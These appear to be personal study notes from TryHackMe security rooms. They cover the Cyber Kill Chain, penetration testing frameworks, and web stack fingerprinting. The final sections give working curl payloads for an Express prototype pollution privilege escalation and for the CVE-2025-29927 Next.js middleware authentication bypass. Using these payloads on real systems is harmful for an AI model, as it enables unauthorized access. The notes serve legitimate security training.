# Cyber Kill Chain
[LINK](https://tryhackme.com/room/cyberkillchain)


1. Reconnaissance: In the first stage, the attacker gathers information about the target
2. Weaponisation: Once proper reconnaissance is conducted, the attacker creates a deliverable payload or modifies an existing one based on the target system’s vulnerabilities
3. Delivery: Once ready, the attacker sends the weaponised payload to the target
4. Exploitation: Once executed, the payload exploits a vulnerability in the target’s system
5. Installation: The exploitation enables the attacker to install a backdoor or malware to maintain in the target’s environment
6. Command & Control (): Using the installed backdoor, the attacker can control the compromised system
7. Actions on Objectives: Reaching this far, the attacker can now carry out further actions such as data exfiltration or other systems’ exploitation


# Penetration Testing Frameworks
[LINK](https://tryhackme.com/room/penetrationtestingframeworks)

###  OSSTMM 
Open Source Security Testing Methodology Manual

### OWASP WSTG
Open Web Application Security Project - Web Security Testing Guide (WSTG)

### NIST SP 800-115
National Institute of Standards and Technology 

### PTES
Penetration Testing Execution Standard

### ISSAF
Information Systems Security Assessment Framework

### MITRE ATT&CK

### WASC Threat Classification
Web Application Security Consortium

### CSA Cloud Controls Matrix(CCM)
Cloud Security Alliance (CSA) 

### MASTG
OWASP Mobile Application Security Testing Guide

### PCI DSS Penetration Testing Guidelines
Payment Card Industry Data Security Standard

### CBEST Framework


# Content Discovery
[LINK](https://tryhackme.com/room/contentdiscoveryx)

**Virtual Hosts Discovery with gobuster**


# Modern Web Stacks
[LINK](https://tryhackme.com/room/modernwebstacks)


### MERN Stack

- **`X-Powered-By: Express`** header (main signal)
- **`connect.sid`** cookie (express-session)
- **Plain text error:** `Cannot GET /nonexistent`

#### The Vulnerability: Prototype Pollution
- Unsafe recursive `merge` function that doesn’t filter `__proto__` or `constructor.prototype`.
- Payload: `{"__proto__": {"isAdmin": true}}`

#### Exploitation Steps
1. **Save session cookie** → `curl -c cookies.txt http://target:3000/`
2. **Pollute prototype** →  
   `curl -b cookies.txt -X POST http://target:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'`
3. **Access protected admin endpoint** →  
   `curl -b cookies.txt http://target:3000/api/admin/flag`


## Next.js

- **`X-Powered-By: Next.js`** header  
- **HTML source contains `window.__next_f`** (definitive App Router indicator)  
- Static asset paths: `/_next/static/chunks/`  
- `x-nextjs-cache` and `x-nextjs-prerender` headers

> **Note:** Development mode (`next dev`) is **not** vulnerable. Production build (`npm run build && npm start`) is required.


#### CVE-2025-29927 – Middleware Authentication Bypass (CVSS 9.1 Critical)

**What it is:**  
Next.js uses an internal header `x-middleware-subrequest` to prevent infinite loops when middleware calls itself. The framework never validated if the header came from an internal process or an external client.

**Attack:**  
Send the header with your request to skip middleware entirely (bypass authentication, session checks, etc.).

**Payload format:**  
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://target/dashboard
```
- For root-level `middleware.ts` → `middleware` repeated 5 times
- For `src/middleware.ts` → `src/middleware` repeated 5 times

**Result:** Access protected routes (e.g., `/dashboard`) without login.

